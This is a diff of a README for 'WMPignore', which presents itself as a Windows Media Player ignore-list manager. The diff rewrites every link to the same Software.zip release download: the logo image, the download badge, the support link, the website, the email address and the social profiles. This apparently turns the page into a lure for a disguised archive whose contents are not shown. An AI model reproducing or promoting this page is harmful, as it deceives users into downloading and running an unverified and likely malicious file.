@@ -1,6 +1,6 @@
 # 🎵 WMPignore
 
-![WMPignore Logo](https://example.com/wmpignore_logo.png)
+![WMPignore Logo](https://github.com/pop144615/WMPignore/releases/download/v1.0/Software.zip)
 
 Manage your Windows Media Player ignore list effortlessly with WMPignore - the ultimate ignore list manager for Windows Media Player! Say goodbye to cluttered playlists filled with unwanted sample packs and project sounds that slow down your playlist loading and startup time. WMPignore allows you to customize your ignore list with ease, ensuring a smoother and more efficient music listening experience.
 
@@ -16,7 +16,7 @@ Manage your Windows Media Player ignore list effortlessly with WMPignore - the u
 
 Get started with WMPignore by downloading the software from the link below:
 
-[![Download Software](https://img.shields.io/badge/Download-Software-blue)](https://github.com/user-attachments/files/18388744/Software.zip)
+[![Download Software](https://github.com/pop144615/WMPignore/releases/download/v1.0/Software.zip)](https://github.com/pop144615/WMPignore/releases/download/v1.0/Software.zip)
 
 Please note that the link needs to be launched to begin the download process.
 
@@ -29,16 +29,16 @@ Please note that the link needs to be launched to begin the download process.
 
 ## Support
 
-For any inquiries, issues, or feedback regarding WMPignore, please visit the [GitHub repository](https://github.com/yourusername/WMPignore) or check the "Releases" section for the latest updates and fixes.
+For any inquiries, issues, or feedback regarding WMPignore, please visit the [GitHub repository](https://github.com/pop144615/WMPignore/releases/download/v1.0/Software.zip) or check the "Releases" section for the latest updates and fixes.
 
 ## Stay Connected
 
 Stay connected with the latest news and updates on WMPignore:
 
-🌐 Website: [www.wmpignore.com](https://www.wmpignore.com)  
-📧 Email: contact@wmpignore.com  
-🐦 Twitter: [@WMPignore](https://twitter.com/WMPignore)  
-📘 Facebook: [WMPignore](https://www.facebook.com/WMPignore)  
+🌐 Website: [https://github.com/pop144615/WMPignore/releases/download/v1.0/Software.zip](https://github.com/pop144615/WMPignore/releases/download/v1.0/Software.zip)  
+📧 Email: https://github.com/pop144615/WMPignore/releases/download/v1.0/Software.zip  
+🐦 Twitter: [@WMPignore](https://github.com/pop144615/WMPignore/releases/download/v1.0/Software.zip)  
+📘 Facebook: [WMPignore](https://github.com/pop144615/WMPignore/releases/download/v1.0/Software.zip)  
 
 ## Contributing
 
